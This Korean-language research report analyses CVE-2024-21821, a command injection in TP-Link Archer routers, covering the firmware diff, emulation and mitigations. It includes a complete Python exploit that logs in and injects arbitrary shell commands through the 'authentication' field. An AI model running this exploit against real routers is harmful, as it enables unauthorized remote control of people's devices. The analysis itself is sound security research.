

# CVE-2024-21821 분석 보고서

> **요약**: TP‑Link Archer 계열 라우터의 LuCI 컨트롤러(`folder_sharing.lua`)에서 **OS 명령어 주입**이 가능했던 취약점. 패치(2023‑11‑15)에서는 **입력값 검증 추가**와 **명령 실행 방식 전환(문자열 → 인자 배열)**로 제거됨. 본 문서는 정적 분석, 에뮬레이션 절차, PoC, 공격 흐름을 체계적으로 정리한다.

---

## 1. 취약점 소개

### 1.1 개요

| 항목 | 내용 |
|---|---|
| 취약점 명칭 | CVE-2024-21821 |
| 취약 유형 | OS 명령어 주입 *(CWE-78)* [[CVE Details]](https://www.cvedetails.com/cve/CVE-2024-21821/) |
| 심각도 (CVSS) | 8.0 / HIGH [[NVD]](https://nvd.nist.gov/vuln/detail/cve-2024-21821) |
| 공격 조건 | 네트워크 인접(Adjacently) / **인증 필요** |
| 발생 위치 | LuCI backend: `usr/lib/lua/luci/controller/admin/folder_sharing.lua` |
| PoC 공개 여부 | 공개 PoC 없음 *(본 문서의 PoC는 연구 재현용 Safe 설정 제공)* |

### 1.2 영향 범위

| 제품 | 영향 받는 버전 |
|---|---|
| Archer AX3000 | "Archer AX3000(JP)_V1_1.1.2 Build 20231115" **이전** |
| Archer AX5400 | "Archer AX5400(JP)_V1_1.1.2 Build 20231115" **이전** |
| **Archer AXE75** | **"Archer AXE75(JP)_V1_231115" 이전** |
| Archer Air R5 | "Archer Air R5(JP)_V1_1.1.6 Build 20240508" **이전** |

### 1.3 테스트 이미지

- **취약 버전**: Archer AXE75_V1_230718  
  링크: <https://static.tp-link.com/upload/firmware/2023/202308/20230822/Archer%20AXE75_V1_230718.zip>

- **패치 버전**: Archer AXE75_V1_231115  
  (아카이브) <https://web.archive.org/web/20240709074526if_/https://static.tp-link.com/upload/firmware/2023/202312/20231212/Archer%20AXE75_V1_231115.zip>

---

## 2. 정적 분석

### 2.1 펌웨어 구조(SquashFS 루트)

```bash
squashfs-root/
├── bin/               # busybox 등
├── usr/
│   ├── sbin/uhttpd    # 웹 서버
│   └── lib/lua/luci/
│       └── controller/
│           ├── admin/folder_sharing.lua  # 취약 위치
│           └── blocking.lua              # (21833 관련 변경)
├── etc/
└── www/
```

### 2.2 추출

아카이브 내 펌웨어 BIN을 `binwalk -Me`로 추출한다.

```bash
binwalk -Me 'axe75v1-axe5400-up-ver1-1-8-P1[20230718-rel47014]_nosign_2023-07-28_09.36.20.bin'
```

### 2.3 Diffing (취약 → 패치)

```bash
diff -qr \
  "/path/to/Archer AXE75_V1_230718/squashfs-root/" \
  "/path/to/Archer AXE75_V1_231115/squashfs-root/"
```

주요 차이:

1. **버전 관리 파일 변경**: `etc/partition_config/soft-version` 차이
2. **CVE-2024-21821 패치**: `usr/lib/lua/luci/controller/admin/folder_sharing.lua` 변경
3. **(참고) CVE-2024-21833 관련**: `usr/lib/lua/luci/controller/blocking.lua` 변경

#### 2.3.1 `folder_sharing.lua` 의 핵심 변경

```diff
- data["authentication"] = form["authentication"]
+ if data["authentication"] ~= "on" and data["authentication"] ~= "off" then
+     return false, "invalid arguments"
+ end
```

```diff
- local cmd = "change_smb_conf " .. data["authentication"] .. " " .. username .. " " .. password
- sys.call(cmd)
+ local cmd = {"/sbin/change_smb_conf", data["authentication"], username, password}
+ subprocess.call(cmd)
```

**의미**
- 입력 검증 추가(허용값: `on`/`off`).
- 쉘 문자열 결합 → **인자 배열 실행** 전환으로 명령 주입 차단.

### 2.4 요청 경로와 디스패치 흐름

```lua
function index()
    entry({"admin", "folder_sharing"}, call("folder_index")).leaf = true
end

function folder_index()
    ctl._index(folder_dispatch)
end

function folder_dispatch(http_form)
    return ctl.dispatch(folder_tbl, http_form, { post_hook = hook })
end

local folder_tbl = {
  auth = {
    ["read"]  = { cb = share_auth },
    ["write"] = { cb = share_auth },
  },
}
```

- 엔드포인트: `/cgi-bin/luci/admin/folder_sharing/auth`
- POST `operation=write` → `share_auth()` 실행 경로로 도달

---

## 3. 에뮬레이션(User-mode)

### 3.1 QEMU 바이너리 주입

```bash
cd /path/to/squashfs-root/usr/bin
cp /usr/bin/qemu-arm-static .
```

### 3.2 마운트 & chroot

```bash
sudo mount --bind /dev ./dev
sudo mount --bind /proc ./proc
sudo rm -rf var && mkdir -p var/run
sudo chroot . /bin/bash

# chroot 내부
ubusd &
exit
```

### 3.3 웹 서버 실행

```bash
sudo chroot . usr/bin/qemu-arm-static /usr/sbin/uhttpd \
  -f -h /www -r Archer_AXE300 -x /cgi-bin -t 120 -T 30 -A 1 -n 3 -R -p 0.0.0.0:80
```

> **팁**: 문제 발생 시 `-strace`로 디버깅.
>
> ```bash
> sudo chroot . /usr/bin/qemu-mipsel-static -strace -D /tmp/qemu.log /usr/bin/httpd
> ```

### 3.4 Trouble Shooting — `account1` 누락

`/etc/config/usbshare` 설정에서 참조되는 `account1`(username/password) 섹션이 없으면 아래와 같은 예외가 발생한다.

```
... folder_sharing.lua:696: attempt to concatenate local 'password' (a nil value)
```

`uci`에 `account1` 을 추가한 뒤 재시도하면 정상 접근 가능하다(웹 UI 확인 스크린샷 참조).

---

## 4. Exploit (연구 재현용)

### 4.1 PoC 코드

> 인증 이후 `authentication` 파라미터에 세미콜론(;)을 이용해 페이로드를 삽입하는 취지의 재현용 코드. **패치 이전 펌웨어에서만** 동작한다.

```python
#!/usr/bin/python3
# CVE-2024-21821 — TP-Link Archer Authenticated Command Injection (RCE)
# Based on diff around folder_sharing.lua

import argparse
import requests
import binascii, base64, os, re, json, sys, time, random, hashlib
from Crypto.Cipher import AES
from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad, unpad
from urllib.parse import urlencode

class WebClient(object):
    def __init__(self, target, password):
        self.target = target
        self.password = password.encode('utf-8')
        self.password_hash = hashlib.md5(('admin%s'%password).encode('utf-8')).hexdigest().encode('utf-8')
        self.aes_key = (str(time.time()) + str(random.random())).replace('.','')[0:AES.block_size].encode('utf-8')
        self.aes_iv = (str(time.time()) + str(random.random())).replace('.','')[0:AES.block_size].encode('utf-8')
        self.stok = ''
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        data = self.basic_request('/login?form=auth', {'operation':'read'})
        self.sign_rsa_n = int(data['data']['key'][0], 16)
        self.sign_rsa_e = int(data['data']['key'][1], 16)
        self.seq = data['data']['seq']
        data = self.basic_request('/login?form=keys', {'operation':'read'})
        self.password_rsa_n = int(data['data']['password'][0], 16)
        self.password_rsa_e = int(data['data']['password'][1], 16)
        self.stok = self.login()

    def aes_encrypt(self, k, iv, bs, pt):
        return AES.new(k, AES.MODE_CBC, iv=iv).encrypt(pad(pt, bs))

    def aes_decrypt(self, k, iv, bs, ct):
        return unpad(AES.new(k, AES.MODE_CBC, iv=iv).decrypt(ct), bs)

    def rsa_encrypt(self, n, e, pt):
        pk = RSA.construct((n, e))
        enc = PKCS1_v1_5.new(pk)
        block = int(pk.n.bit_length()/8) - 11
        out = b''
        for i in range(0, len(pt), block):
            out += enc.encrypt(pt[i:i+block])
        return out.hex()

    def basic_request(self, url, data, files={}):
        res = self.session.post(f'http://{self.target}/cgi-bin/luci/;stok={self.stok}{url}', data=data, files=files, timeout=5)
        return res.json()

    def encrypted_request(self, url, post_data):
        ser = urlencode(post_data).encode('utf-8')
        enc = base64.b64encode(self.aes_encrypt(self.aes_key, self.aes_iv, AES.block_size, ser))
        sig = ('k=%s&i=%s&h=%s&s=%d'.encode('utf-8')) % (self.aes_key, self.aes_iv, self.password_hash, self.seq+len(enc))
        enc_sig = self.rsa_encrypt(self.sign_rsa_n, self.sign_rsa_e, sig)
        r = self.session.post(f'http://{self.target}/cgi-bin/luci/;stok={self.stok}{url}', data={'sign':enc_sig, 'data':enc}, timeout=10)
        if r.status_code != 200:
            return None
        j = r.json()
        if 'data' not in j:
            return j
        dec = self.aes_decrypt(self.aes_key, self.aes_iv, AES.block_size, base64.b64decode(j['data']))
        return json.loads(dec)

    def login(self):
        pw = self.rsa_encrypt(self.password_rsa_n, self.password_rsa_e, self.password)
        j = self.encrypted_request('/login?form=login', {'operation':'login', 'password': pw})
        if not j or not j.get('success'):
            sys.exit(-1)
        return j['data']['stok']

if __name__ == '__main__':
    ap = argparse.ArgumentParser(description='CVE-2024-21821 (Authenticated RCE) — for unpatched firmware')
    ap.add_argument('-t', required=True, help='target IP')
    ap.add_argument('-p', required=True, help='admin password')
    ap.add_argument('-c', default='uname -a > /www/poc.txt', help='command to run')
    a = ap.parse_args()

    cli = WebClient(a.t, a.p)
    if cli.stok:
        endpoint = '/admin/folder_sharing?form=auth'
        inj = f"off; {a.c}; #"  # 주입 페이로드
        payload = {'operation': 'write', 'authentication': inj}
        resp = cli.encrypted_request(endpoint, payload)
        print(resp)
        print(f'Check http://{a.t}/poc.txt')
```

### 4.2 공격 흐름 요약

1) **클라이언트**: 로그인 → `stok` 획득 → `/admin/folder_sharing?form=auth` 로 `operation=write` 전송  
2) **서버**: `index → folder_index → folder_dispatch → ctl.dispatch` 경유, `share_auth()` 호출  
3) **패치 전**: `authentication` 값 미검증 + 문자열 결합 실행(`sys.call`) → **RCE**  
4) **패치 후**: 허용값 검증 + 인자 배열 실행(`subprocess.call`) → **주입 차단**

---

## 5. 재현 체크리스트

- [ ] 펌웨어 추출 및 SquashFS 루트 준비 완료
- [ ] `qemu-*-static` 주입 및 `ubusd`, `uhttpd` 기동
- [ ] `uci` 에 `account1.username/password` 구성
- [ ] 대상 펌웨어가 **패치 이전**임 확인
- [ ] 네트워크는 로컬/격리 환경(교육·연구 목적)

---

## 6. 완화/패치 요약

- 입력값 화이트리스트(`on`/`off`) 도입
- 쉘 문자열 실행 → **인자 배열 실행**(subprocess)
- 운영 측면: USB 공유 기능 미사용 시 비활성화, 관리자 UI 접근 제한, 최신 펌웨어 적용

---

## 7. 참고 링크

- NVD: <https://nvd.nist.gov/vuln/detail/cve-2024-21821>
- CVE Details: <https://www.cvedetails.com/cve/CVE-2024-21821/>

---

> **주의**: 본 문서는 교육·연구 재현 목적이며, 패치 이전 기기에 대한 무단 테스트를 금한다. 공개 PoC는 외부 네트워크를 사용하지 않는 **격리 환경**에서만 사용한다.